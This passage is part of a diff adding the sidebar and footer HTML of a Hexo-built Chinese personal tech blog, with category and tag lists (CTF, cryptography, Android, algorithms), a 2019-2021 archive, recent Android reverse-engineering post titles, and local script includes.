href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP-Inventor/" rel="tag">APP Inventor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" rel="tag">信息安全数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" rel="tag">教材答案</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" rel="tag">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/APP-Inventor/" style="font-size: 10.83px;">APP Inventor</a> <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/CSharp/" style="font-size: 10px;">CSharp</a> <a href="/tags/CTF/" style="font-size: 19.17px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 12.5px;">DVWA</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 14.17px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/Reverse/" style="font-size: 11.67px;">Reverse</a> <a href="/tags/Web/" style="font-size: 17.5px;">Web</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/writeup/" style="font-size: 18.33px;">writeup</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" style="font-size: 10.83px;">信息安全数学</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 14.17px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 10px;">区块链</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10.83px;">协议</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15.83px;">密码学</a> <a href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" style="font-size: 13.33px;">库与模块</a> <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" style="font-size: 10.83px;">拒绝服务攻击</a> <a href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" style="font-size: 10px;">教材答案</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">数据结构</a> <a href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 15px;">牛客网</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 17.5px;">算法</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 16.67px;">经验</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 15.83px;">网络安全</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" style="font-size: 15.83px;">计算机考研复试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/21/IDA%20Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90dex%E6%96%87%E4%BB%B6/">IDA Pro静态分析dex文件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/13/%E7%BC%96%E5%86%99%E5%B9%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">编写并分析第一个Android应用程序</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/05/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android四大组件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/25/%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%94%9F%E6%B6%AF%E6%80%BB%E7%BB%93/">中国矿业大学本科生涯总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/19/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%80%83%E7%A0%94--%E5%A4%8D%E8%AF%95--%E6%9C%BA%E8%AF%95%E5%88%B7%E9%A2%98/">北京工业大学考研--复试--机试刷题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 iHui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
